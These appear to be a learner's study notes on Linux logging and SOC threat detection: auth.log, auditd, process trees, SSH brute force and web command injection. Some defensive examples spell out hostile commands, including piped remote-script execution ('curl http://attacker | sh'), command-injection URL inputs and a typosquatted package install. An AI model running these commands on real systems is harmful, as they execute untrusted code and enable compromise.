# 1. Linux Logging for SOC
## a. Introduciton

This room introduces Linux logging from a SOC perspective, focusing on how analysts investigate security events on Linux systems used in servers, cloud environments, and containers.

🐧 Key idea

Linux is widely used in:

Servers (on-premises)
Cloud infrastructure
Containers (Docker/Kubernetes)

So SOC analysts must understand Linux logs just like Windows logs.

📊 Learning Objectives
1. Explore main Linux log sources

You will work with:

Authentication logs
Track login attempts, success/failure
Example: SSH login activity
System logs
General system events
Kernel and service activity
Runtime logs
Application-level behavior
2. Learn Linux log commands

You will practice commands like:

Viewing logs directly on the machine
Filtering and searching logs
Understanding common mistakes when analyzing logs
3. Learn auditd (important for SOC)
auditd = Linux auditing system
Tracks:
File access
Process execution
System changes
Helps detect malicious activity at a low level
4. Hands-on practice
Analyze real log files in the VM
Work like a SOC analyst investigating incidents
⚙️ Important setup info
You may need root access
Use:
sudo su
Lab runs in split view VM
Takes ~2 minutes to load

## b. Working with Text Logs
This section explains how Linux logging works from a SOC perspective, focusing on how analysts read and investigate logs directly on the system.

🧠 Key Concepts
Linux systems (Ubuntu, Debian, CentOS, RHEL) store logs as plain text files

Logs are mainly located in:

/var/log/
📊 Main log file: syslog
/var/log/syslog contains general system events
Includes services like:
system startup
time synchronization
cron jobs
system processes
🔍 Filtering logs (important for SOC)

Because logs are large, analysts use tools like:

grep → search keywords
grep -v → exclude keywords

Example:

cat /var/log/syslog | grep CRON
🔎 Discovering useful logs

If you don’t know where events are stored:

Search /var/log/ directory
Use keywords like:
auth
login
session

Example:

grep -R "login" /var/log/
⚠️ Important caveats
Linux logging is not standardized like Windows Event IDs
Format varies across distributions
Logs can be customized or disabled

## c. Authentication Logs
This section explains how SOC analysts investigate authentication activity on Linux systems using /var/log/auth.log (or /var/log/secure on RHEL systems).

🔐 What auth.log contains

This file logs:

User logins (SSH, local login)
Failed login attempts
sudo usage
User creation and deletion
Privilege changes
📊 1. Login & session tracking

You can track user sessions using:

session opened
session closed

Examples:

Local login (login session)
Remote SSH login (sshd session)
Service logins (cron, samba)

👉 Helps identify who accessed the system and when.

🔑 2. SSH authentication logs

SSH logs show:

Failed logins:

Failed password for user from IP

Successful logins:

Accepted publickey for user from IP

👉 Useful for detecting brute-force attacks.

👤 3. User management events

Tracked commands include:

useradd → new user created
userdel → user removed
usermod → privilege changes
passwd → password changes

👉 SOC analysts use this to detect:

backdoor accounts
privilege escalation

Example:

user added to sudo group = high risk
⚡ 4. Sudo command monitoring

Using:

COMMAND=

You can see exactly what users executed with sudo:

stopping security tools
changing firewall rules
gaining root access

👉 Very important for detecting malicious behavior

🔎 SOC takeaway

From /var/log/auth.log, you can detect:

Brute-force attacks (SSH failures)
Unauthorized logins
Privilege escalation
User creation/backdoors
Suspicious sudo usage

## d. Common Linux Logs
This section explains additional Linux log sources beyond authentication logs, focusing on system activity, application logs, and command history.

📊 1. Generic System Logs

Linux stores many system-level events in /var/log/:

🔧 Key log files:
/var/log/kern.log
Kernel-level events (hardware, drivers, errors)
Useful for deep system or forensic investigations
/var/log/syslog (or /var/log/messages)
Central log file for general system activity
Includes services, processes, cron jobs, etc.
Package manager logs
Debian/Ubuntu:
/var/log/dpkg.log
/var/log/apt
RHEL/CentOS:
/var/log/dnf.log
/var/log/yum.log

👉 Used to track software installation, updates, or suspicious package changes

🌐 2. Application-Specific Logs

Different services have their own logs.

Example: Nginx access log
10.0.1.12 - - "GET /login"
10.0.5.21 - - "GET /admin" 403
SOC uses this for:
Tracking user behavior
Detecting unauthorized access attempts
Identifying suspicious requests (e.g., /admin)
🧾 3. Bash History
What it is:
Records commands typed by users

Stored in:

~/.bash_history
Example:
nano /etc/ssh/sshd_config
sudo su
Or view live history:
history
⚠️ Limitations of Bash History

Attackers can avoid detection by:

🕵️ 1. Hidden commands
Leading space → not logged
🧪 2. Script execution
Commands inside .sh files are not fully tracked
🐚 3. Using other shells
/bin/sh does NOT store history like Bash

👉 Because of this, SOC teams do NOT rely heavily on Bash history.

🧠 SOC Key Takeaways
Linux logs are scattered across /var/log/
Important categories:
system logs (syslog, kern.log)
package logs (apt/dpkg/yum)
application logs (nginx, database, mail)
Bash history is useful but unreliable
Real SOC investigations rely more on:
syslog
auth.log
auditd
application logs

## e. Runtime Monitoring
<img width="358" height="151" alt="image" src="https://github.com/user-attachments/assets/1b8431bf-452e-4046-95c1-32abac5c0994" />
<img width="1525" height="280" alt="image" src="https://github.com/user-attachments/assets/4aa46bbe-f1cd-46ab-9d61-c3085546c3b2" />
This section explains a key limitation of traditional Linux logging: it does not automatically record runtime activity such as process creation, file changes, or network behavior.

⚠️ Problem: Missing runtime visibility

Default Linux logs (like auth.log, syslog) can show:

Logins
System events
Service activity

But they cannot reliably show:

Which program was executed
File deletions/modifications
Real-time process behavior
Network activity per process

👉 This creates a visibility gap in SOC monitoring.

🔧 Solution: Runtime monitoring (like Sysmon on Windows)

Linux uses tools like:

auditd
EDR agents

These tools monitor system calls (syscalls) to track runtime behavior.

⚙️ What are system calls?

A system call is how programs interact with the Linux kernel.

Examples:

Run a program
Open a file
Create a process
Access hardware
🚀 Key system call: process execution

When a program is launched, Linux uses:

execve()

👉 This is the system call used to execute programs.

🧠 Why system calls are important for SOC
Every program must use system calls
Attackers cannot bypass them
EDR tools monitor them to detect:
malware execution
file access
suspicious behavior


## f. Audit Daemon
Auditd (Audit Daemon) is a built-in auditing solution often used by the SOC team for runtime monitoring. In this task, we will skip the configuration part and focus on how to read auditd rules and how to interpret the results. Let's start from the rules - instructions located in /etc/audit/rules.d/ that define which system calls to monitor and which filters to apply:

Four Auditd rules, one to detect "wget", two to detect file operations, and one to detect network connections made by "python3"

Monitoring every process, file, and network event can quickly produce gigabytes of logs each day. But more logs don't always mean better detection since an attack buried in a terabyte of noise is still invisible. That's why SOC teams often focus on the highest-risk events and build balanced rulesets, like this one(opens in new tab) or the example you saw above.

Using Auditd
You can view the generated logs in real time in /var/log/audit/audit.log, but it is easier to use the ausearch command, as it formats the output for better readability and supports filtering options. Let's see an example based on the rules from the example above by searching events matching the "proc_wget" key:

Looking for "Wget" Execution
root@thm-vm:~$ ausearch -i -k proc_wget
----
type=PROCTITLE msg=audit(08/12/25 12:48:19.093:2219) : proctitle=wget https://files.tryhackme.thm/report.zip
type=CWD msg=audit(08/12/25 12:48:19.093:2219) : cwd=/root
type=EXECVE msg=audit(08/12/25 12:48:19.093:2219) : argc=2 a0=wget a1=https://files.tryhackme.thm/report.zip
type=SYSCALL msg=audit(08/12/25 12:48:19.093:2219) : arch=x86_64 syscall=execve [...] ppid=3752 pid=3888 auid=ubuntu uid=root tty=pts1 exe=/usr/bin/wget key=proc_wget
The terminal above shows a log of a single "wget" command. Here, auditd splits the event into four lines: the PROCTITLE shows the process command line, CWD reports the current working directory, and the remaining two lines show the system call details, like:

pid=3888, ppid=3752: Process ID and Parent Process ID. Helpful in linking events and building a process tree
auid=ubuntu: Audit user. The account originally used to log in, whether locally (keyboard) or remotely (SSH)
uid=root: The user who ran the command. The field can differ from auid if you switched users with sudo or su
tty=pts1: Session identifier. Helps distinguish events when multiple people work on the same Linux server
exe=/usr/bin/wget: Absolute path to the executed binary, often used to build SOC detection rules
key=proc_wget: Optional tag specified by engineers in auditd rules that is useful to filter the events
File Events

Now, let's look at the file events matching the "file_sshconf" key. As you may see from the terminal below, auditd tracked the change to the /etc/ssh/sshd_config file via the "nano" command. SOC teams often set up rules to monitor changes in critical files and directories (e.g., SSH configuration files, cronjob definitions, or system settings)

Looking forSSH
Configuration Changes
root@thm-vm:~$ ausearch -i -k file_sshconf
----
type=PROCTITLE msg=audit(08/12/25 13:06:47.656:2240) : proctitle=nano /etc/ssh/sshd_config
type=CWD msg=audit(08/12/25 13:06:47.656:2240) : cwd=/
type=PATH msg=audit(08/12/25 13:06:47.656:2240) : item=0 name=/etc/ssh/sshd_config [...]
type=SYSCALL msg=audit(08/12/25 13:06:47.656:2240) : arch=x86_64 syscall=openat [...] ppid=3752 pid=3899 auid=ubuntu uid=root tty=pts1 exe=/usr/bin/nano key=file_sshconf
Auditd Alternatives
You might have noticed an inconvenient output of auditd - although it provides a verbose logging, it is hard to read and ingest into SIEM. That's why many SOC teams resort to the alternative runtime logging solutions, for example:

Sysmon for Linux(opens in new tab): A perfect choice if you already work with Sysmon and love XML
Falco(opens in new tab): A modern, open-source solution, ideal for monitoring containerized systems
Osquery(opens in new tab): An interesting tool that can be broadly used for various security purposes
EDRs: Most EDR solutions can track and monitor various Linux runtime events
The key to remember is that all listed tools work on the same principle - monitoring system calls. Once you've understood system calls, you will easily learn all the mentioned tools. This knowledge also helps you to handle advanced scenarios, like understanding why certain actions were logged in a specific way or not logged at all.

Now, try to uncover a threat actor with process creation logs! For this task, continue with the VM and use auditd logs to answer the questions.
You may need to use ausearch -i and grep commands for this task.


# 2. Linux Threat Detection 1
## a. Introduction 
This task introduces how SOC analysts detect Initial Access techniques on Linux systems, mainly focusing on SSH-based attacks and exposed services.

🎯 Main Idea

Most Linux breaches still begin with:

Exposed SSH services
Weak or stolen credentials
Internet-facing systems

Attackers gain access first, then move deeper into the system.

🔐 1. Role of SSH in Linux security

SSH (Secure Shell):

Used for remote login and administration
Common target for attackers
Risks:
Brute-force attacks
Credential stuffing
Exposed SSH on the internet
🌐 2. Internet-exposed services

If SSH or other services are exposed:

Attackers can scan and find them
They attempt login attacks automatically
Weak configurations lead to compromise
🧠 3. Process tree analysis (important SOC skill)

SOC analysts trace:

Which process started the attack
How malicious activity began

Example chain:

sshd → bash → malicious script → payload execution

👉 Helps identify root cause of compromise

🔍 4. Detection goals in this lab

You will practice:

Detecting SSH-based Initial Access
Identifying suspicious login activity
Tracing process origins using logs
Analyzing attack chains in Linux
⚙️ 5. Lab setup
Start VM in split view
Takes ~2 minutes to load
May require root access:
sudo su

## b. Initial Access via SSH 
<img width="577" height="207" alt="image" src="https://github.com/user-attachments/assets/9d8457ac-49db-4464-bd5f-ead37615721c" />
This section explains why SSH (Secure Shell) is one of the most commonly exploited services for Initial Access on Linux systems.

🌍 Why SSH is so popular
Used on almost every Linux server
Enables remote administration
Exposed on the internet in millions of systems (~40M+)
Frequently targeted by attackers using botnets
🔐 How attackers exploit SSH

SSH is tracked under MITRE technique:

External Remote Services (T1133)

Attackers gain access mainly in two ways:

1. Password-based attacks

Common mistakes:

Weak passwords (e.g., 12345678)
Temporary test credentials left exposed
Misconfigured servers exposed to Internet

👉 Leads to brute-force or credential guessing attacks

2. SSH key-based attacks

Even more dangerous if private keys are leaked:

Keys stored in GitHub or automation tools (Ansible, CI/CD)
Stolen via malware on admin machines
Reused across multiple servers
⚠️ Real-world risk
Botnets constantly scan the Internet for SSH
Many attacks start from:
weak credentials
exposed services
Advanced threats may involve:
SSH vulnerabilities
session hijacking
🔍 SOC detection approach

Analysts inspect:

cat /var/log/auth.log | grep sshd

They look for:

Login timestamps
Username (e.g., ubuntu)
IP addresses
Authentication method (password vs key)
🧠 Key takeaway

SSH is powerful but:

“If exposed and weakly configured, it becomes a direct entry point for attackers.”

## c. Detecting SSH Attacks
This section explains how SOC analysts detect an SSH brute-force attack leading to a successful compromise by analyzing /var/log/auth.log.

🔐 1. Attack scenario

A typical SSH breach happens when:

SSH is exposed to the internet
Password authentication is enabled
Weak credentials exist

👉 Attack flow:

Botnet scans SSH
Brute-force starts
Multiple failed logins occur
One successful login gives attacker access
🔍 2. Key log indicators
❌ Failed logins (brute force)
Failed password for <user> from <IP>

Used to identify:

attack start time
targeted usernames
botnet activity
✅ Successful logins (breach)
Accepted password for <user> from <IP>

Used to identify:

compromised account
attacker IP
entry point
🧠 3. How SOC analysts investigate

To determine if login is malicious, they check:

👤 Username (is it normal user?)
🌐 IP address (internal or external?)
⏰ Time of login (normal working hours?)
🔁 Brute-force history before success?
🚨 4. Key indicators of SSH compromise
Password-based login from external IP
Multiple failed attempts before success
Login at unusual time
Root or privileged account access
⚙️ 5. SOC workflow
Find Failed password → brute force start
Extract usernames attacked
Find Accepted password → breach success
Identify attacker IP
Correlate with user behavior after login

## d. Initial Access via Services
This section explains how public-facing Linux services (especially web apps) can become entry points for attackers, even when logs don’t explicitly say “I am compromised”.

🌐 1. Risk of public services (MITRE T1190)

Any exposed application can be exploited, such as:

Web servers (Nginx, Apache)
Email servers (Zimbra)
VPN/firewalls (Palo Alto, etc.)
Containers (Docker API)

👉 This is covered by:
T1190 – Exploit Public-Facing Application

💥 2. Real-world exploitation examples

Attackers exploit:

CVEs (software vulnerabilities)
Misconfigured services
Exposed admin panels

Examples:

Zimbra RCE → OS command execution
Docker API exposed → full host compromise
WordPress plugin abuse → web shell upload
🌐 3. Web apps as entry points

Even simple apps can be dangerous if poorly designed.

Example: TryPingMe

Takes user input in URL
Runs system command:
ping -c 2 [input]

🚨 No input validation = Command Injection vulnerability

⚠️ 4. How attackers exploit it

From web logs:

GET /ping?host=hello
GET /ping?host=whoami
GET /ping?host=;ls

👉 Red flags:

Commands instead of IPs
Special characters (;)
System commands like whoami, ls
🧠 5. SOC analysis findings

From logs, analysts conclude:

Attacker IP identified: 10.14.105.255
Vulnerable endpoint: /ping
Remote command execution confirmed
System likely fully compromised
🔍 6. SOC workflow
Analyze web logs (access.log)
Identify abnormal inputs
Detect command injection patterns
Trace attacker IP
Identify post-exploitation activity

## e. Detecting Service Breach
This section teaches how SOC analysts use process tree analysis (via auditd) to trace malicious activity back to its source, especially when application logs are missing or incomplete.

🌳 1. What is a process tree?

A process tree shows:

Which process started another process
Parent → child relationships
Full execution chain of an action

👉 Example:

python app → shell → command (whoami) → attack activity
🔍 2. Why SOC uses process trees

Because logs like:

web logs
auth logs

❌ do NOT show full execution flow

Process tree helps answer:

“Who actually executed this malicious command?”

⚙️ 3. Tool used: auditd

SOC analysts use:

ausearch

To trace process execution:

Step 1: find command
ausearch -x whoami
Step 2: check parent process
ausearch --pid <PPID>
Step 3: move upward until root process (PID 1)
🧠 4. Key insight

A simple command like:

whoami

may actually come from:

/usr/bin/python3 /opt/mywebapp/app.py

👉 meaning:

web app was exploited
attacker used it to run OS commands
🚨 5. Detecting deeper attack

SOC does NOT stop at one command.

They look for:

ls
curl
bash
reverse shell activity

Example:

curl http://attacker | sh
🔍 6. SOC workflow
Detect suspicious command (e.g., whoami)
Find its PID
Trace PPID → parent process
Identify application origin
Investigate full child process tree
Confirm exploitation

## f.Advanced Initial Access
This section explains how attackers can still compromise Linux systems through human mistakes and trusted software, even without direct exploitation of exposed services.

🧑‍💻 1. Human-led attacks on Linux

Even though Linux servers are less exposed to phishing/USB attacks, humans still cause breaches through:

⚠️ Common mistakes:
Running unknown scripts:
curl https://badsite/fix.sh | bash
Installing wrong/malicious packages:
pip3 install fastpi

👉 One typo or blind trust can lead to malware execution

🔗 2. Supply Chain Compromise

This is a major modern threat.

💡 Idea:

Attackers compromise:

a library
a package
or a dependency

👉 Then every user of that software gets infected automatically

📦 Real-world examples:
XZ Utils backdoor → nearly compromised SSH worldwide
tj-actions breach → leaked secrets (SSH keys, tokens)
🧠 3. Why this is dangerous
Software depends on many libraries
Developers trust official packages
Updates are automatically installed

👉 Attack happens BEFORE the user even notices

🔍 4. Detection method: Process Tree Analysis

SOC analysts detect all these attacks using:

👉 Process tree analysis

They trace:

what started the process
which app executed the command
whether behavior is legitimate or malicious
🌳 5. Example interpretation
Process behavior	Meaning
PHP runs whoami	Web attack (RCE)
wget from internal service	Supply chain compromise
miner from SSH session	SSH breach
🧠 6. SOC workflow
Detect suspicious activity (alert/log)
Identify process execution
Build process tree
Trace back to origin (user/app/service)
Confirm attack type


